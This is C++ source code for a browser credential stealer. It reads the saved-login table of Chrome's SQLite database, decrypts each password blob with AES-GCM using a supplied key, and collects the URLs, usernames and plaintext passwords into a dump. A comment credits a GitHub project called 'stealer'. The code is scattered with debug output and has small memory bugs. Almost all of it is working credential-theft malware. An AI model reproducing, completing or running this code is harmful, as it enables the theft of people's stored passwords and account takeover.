
#include <windows.h>
#include <Wincrypt.h>
#include <tchar.h>
#include <sstream>
#include <iostream>
#include "sqlite3.h"
#include "aes_gcm.h"
#include <vector>


BYTE * getPassword(BYTE * key, BYTE * encrypted_password, DWORD encryp_len){
    
    //possibly indexing wrong
    //std::vector<BYTE>VEC_IV(encrypted_password + 3, encrypted_password + 15 );
    //std::vector<BYTE>cipher(encrypted_password + 15, encrypted_password + 15 + 23);
    //std::vector<BYTE> VEC_tag(encrypted_password + 15 + 23, encrypted_password + encryp_len); //check all indices
    //BYTE * textIV = VEC_IV.data() ;
    //BYTE * ciphertext = cipher.data();
    //BYTE * tag = VEC_tag.data();
    
    auto box = new AESGCM(key);
    box->ciphertext = encrypted_password + 15;
    box->ctBufferSize = encryp_len - 15 - 16;
    box->tag = encrypted_password + encryp_len - 16;

    //ctBufferSize = (DWORD)cipher.size();
    box->Decrypt(encrypted_password + 3, 12, box->ciphertext,box->ctBufferSize, box->tag, box->authTagLengths.dwMinLength );
    for(size_t i=0; i< box->ptBufferSize; i++){
        printf("%c", (char) box->plaintext[i]);
    }
    BYTE * ret = (BYTE *)malloc(box->ptBufferSize + 1);
    for(size_t i=0; i< box->ptBufferSize; i++){
        ret[i] = box->plaintext[i];
        printf("%c", (char) box->plaintext[i]);
    }
    printf("\n");
    delete box;
    printf("Goodbye!\n");
    return ret;
}

//inspired by https://github.com/HlebHatouka/stealer/blob/master/windows/tools.h
//for how to parse sql data!
std::stringstream get_chrome_pass(BYTE *key, sqlite3* db)
{
    std::string sql = "SELECT action_url, username_value, password_value FROM logins";

    std::stringstream dump(std::string(""));
    sqlite3_stmt *pStmt;
    int rc;
    rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
    if (rc != SQLITE_OK)
    {
        dump << "statement failed rc = " << rc;
        return dump;
    }

    rc = sqlite3_step(pStmt);
    //std::cout << "RC: " << rc << std::endl;
    while (rc == SQLITE_ROW) 
    {
        printf("IN RC row\n");
        dump << sqlite3_column_text(pStmt, 0) << std::endl;
        dump << (char *)sqlite3_column_text(pStmt, 1) << std::endl;
        std::cout << dump.str();
        DATA_BLOB encryptedPass;
        DWORD *data = (DWORD *)malloc(sizeof(DWORD));
        encryptedPass.cbData = *data;
        encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
        encryptedPass.pbData = (BYTE *)malloc((int)encryptedPass.cbData);
        DATA_BLOB decryptedPass;

        
        //encryptedPass.pbData = (BYTE *)malloc((int)encryptedPass.cbData);

        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
        /* print encrypted password*/
        for (DWORD i = 0; i < encryptedPass.cbData; i++){
        printf("%x", encryptedPass.pbData[i]);
    }
    printf("\n");
        printf("ABOUT TO CALL GETPASSW\n");
        /* insert own encryption*/
        BYTE *password= getPassword( key , encryptedPass.pbData, encryptedPass.cbData);
        
       
        while (isprint(*password))
        {
            dump << *password;
            password++;
        }

        dump << std::endl;
        free(data);
        free(encryptedPass.pbData);
        rc = sqlite3_step(pStmt);
    }
    rc = sqlite3_finalize(pStmt);
    return dump;
}